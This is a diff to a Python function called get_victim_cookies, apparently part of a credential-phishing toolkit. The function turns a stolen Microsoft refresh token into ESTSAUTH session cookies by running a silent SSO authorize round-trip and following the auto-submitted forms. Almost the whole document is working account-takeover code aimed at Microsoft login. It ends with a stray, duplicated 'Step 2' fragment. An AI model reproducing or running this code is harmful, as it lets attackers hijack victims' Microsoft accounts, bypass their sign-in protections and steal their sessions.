@@ -155,14 +155,13 @@ def decode_id_token(id_token):
 
 # ---------- Cookie minting ----------
 def get_victim_cookies(refresh_token, client_id, email):
-    """Refresh tokens, then complete the SSO authorize round-trip INCLUDING the
-    auto form_post, so login.microsoftonline.com issues ESTSAUTH cookies."""
+    """Refresh token -> SSO authorize (with form-post handling) -> ESTSAUTH cookies."""
     try:
         s = requests.Session()
         s.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
         })
-        # Step 1: refresh token -> new tokens (same client_id, same scope)
+        # Step 1: refresh token -> new tokens (same client_id that issued it)
         r = s.post(
             f"{UPSTREAM}/common/oauth2/v2.0/token",
             data={
@@ -177,6 +176,43 @@ def get_victim_cookies(refresh_token, client_id, email):
         if "access_token" not in data:
             print("[COOKIES] refresh failed:", data.get("error"), data.get("error_description", "")[:200])
             return None
+
+        # Step 2: SSO authorize round-trip, silently
+        nonce = uuid.uuid4().hex
+        auth_url = (
+            f"{UPSTREAM}/common/oauth2/authorize?"
+            f"client_id={client_id}&response_type=id_token"
+            f"&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient"
+            f"&scope=openid&response_mode=form_post&nonce={nonce}"
+            f"&login_hint={email}&prompt=none"
+        )
+        resp = s.get(auth_url, timeout=25, allow_redirects=True)
+
+        # Step 3: follow auto-submitting HTML forms (up to 5 hops)
+        for _ in range(5):
+            m = re.search(r'<form[^>]*action="([^"]*)"[^>]*>(.*?)</form>',
+                          resp.text, re.IGNORECASE | re.DOTALL)
+            if not m:
+                break
+            action = m.group(1).replace("&amp;", "&")
+            fields = dict(re.findall(
+                r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"', m.group(2)))
+            fields = {k: v.replace("&quot;", '"').replace("&amp;", "&")
+                      for k, v in fields.items()}
+            resp = s.post(action, data=fields, timeout=25, allow_redirects=True)
+
+        cookies = {}
+        for c in s.cookies:
+            if c.name in COOKIE_WANTED and c.value:
+                cookies[c.name] = c.value
+        if not cookies:
+            print("[COOKIES] no wanted cookies captured")
+            return None
+        print(f"[COOKIES] captured {len(cookies)} cookies: {list(cookies.keys())}")
+        return cookies
+    except Exception as e:
+        print(f"[COOKIES] exception: {e}")
+        return None
 
            # Step 2: SSO authorize round-trip so login.microsoftonline.com issues cookies
         nonce = uuid.uuid4().hex
